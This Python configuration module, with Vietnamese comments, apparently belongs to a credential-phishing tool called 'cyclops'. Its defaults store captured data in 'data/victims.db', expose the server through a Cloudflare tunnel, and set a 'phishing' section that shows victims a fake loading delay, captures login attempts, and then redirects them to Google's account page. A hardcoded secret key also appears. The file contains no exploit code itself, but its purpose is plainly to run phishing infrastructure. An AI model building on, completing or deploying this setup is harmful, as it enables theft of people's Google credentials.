#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
from pathlib import Path
from datetime import datetime

class Config:
    """Quản lý cấu hình toàn hệ thống"""
    
    DEFAULT_CONFIG = {
        'server': {
            'host': '0.0.0.0',
            'port': 5000,
            'debug': False,
            'secret_key': 'cyclops_super_secret_2026'
        },
        'database': {
            'path': 'data/victims.db',
            'backup_interval': 3600,  # giây
            'max_entries': 10000
        },
        'security': {
            'encryption': 'aes-256',
            'hash_algorithm': 'bcrypt',
            'salt_rounds': 12
        },
        'cloudflare': {
            'enabled': True,
            'tunnel_timeout': 300,
            'auto_reconnect': True
        },
        'logging': {
            'level': 'INFO',
            'file': 'logs/cyclops.log',
            'max_size_mb': 10,
            'backup_count': 5
        },
        'phishing': {
            'redirect_url': 'https://accounts.google.com/',
            'fake_loading_time': 1.5,
            'capture_attempts': True
        }
    }
    
    def __init__(self, config_file: str = "config.json"):
        self.config_file = Path(config_file)
        self.config = {}
        self.load()
    
    def load(self):
        """Tải cấu hình từ file hoặc tạo mới"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    self.config = json.load(f)
                print(f"✅ Loaded config from {self.config_file}")
            except Exception as e:
                print(f"⚠️ Config load failed: {e}, using defaults")
                self.config = self.DEFAULT_CONFIG.copy()
        else:
            self.config = self.DEFAULT_CONFIG.copy()
            self.save()
    
    def save(self):
        """Lưu cấu hình"""
        try:
            self.config_file.parent.mkdir(exist_ok=True)
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=4, ensure_ascii=False)
            print(f"✅ Config saved to {self.config_file}")
        except Exception as e:
            print(f"❌ Config save failed: {e}")
    
    def get(self, key: str, default=None):
        """Lấy giá trị cấu hình với dot notation"""
        keys = key.split('.')
        value = self.config
        for k in keys:
            if isinstance(value, dict):
                value = value.get(k)
            else:
                return default
        return value if value is not None else default
    
    def set(self, key: str, value):
        """Cập nhật giá trị cấu hình"""
        keys = key.split('.')
        target = self.config
        for k in keys[:-1]:
            if k not in target or not isinstance(target[k], dict):
                target[k] = {}
            target = target[k]
        target[keys[-1]] = value
        self.save()
    
    def get_server_config(self):
        return self.config.get('server', {})
    
    def get_db_path(self):
        return self.get('database.path', 'data/victims.db')
    
    def is_cloudflare_enabled(self):
        return self.get('cloudflare.enabled', True)

# Singleton
config = Config()
